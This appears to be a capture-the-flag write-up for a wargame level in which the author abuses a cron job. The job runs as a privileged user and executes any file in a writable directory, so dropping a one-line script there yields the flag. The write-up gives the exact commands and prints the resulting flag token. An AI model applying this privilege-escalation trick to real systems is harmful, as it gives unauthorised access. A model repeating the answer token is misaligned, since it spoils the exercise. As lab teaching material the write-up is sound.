# Level 05 - Exploiting a Cron Job

## Step 1: Notice the mail notification

Immediately after logging in, we see a notification:
```
You have new mail.
```

## Step 2: Check the mailbox

Most Linux systems store user mail in this location:

```sh
ls -l /var/mail/level05
```

Let's see what is in that file:
```sh
cat /var/mail/level05
```

We can see that it is a cron job, which is executed every 2 minutes:

```
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Because of `su -c`, the script will be executed by the user `flag05`.

## Step 3: Inspect the script

Let's take a look at that file:

```sh
cat /usr/sbin/openarenaserver
```

We see the following script:
```sh
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

This code loops over files in the `/opt/openarenaserver/` directory and executes each one in bash with a 5-second CPU time limit.

Then it deletes the file.

## Step 4: Exploit the cron job

Let's create an executable in that directory to run `getflag`:

```sh
echo "/bin/getflag > /tmp/pass" > /opt/openarenaserver/sdfsd
```

This will create a file `/opt/openarenaserver/sdfsd` with a command to execute `/bin/getflag` and redirect its output to `/tmp/pass`.

After 2 minutes, we get:

```sh
cat /tmp/pass
```

```
Check flag. Here is your token: viuaaale9huek52boumoomioc
```
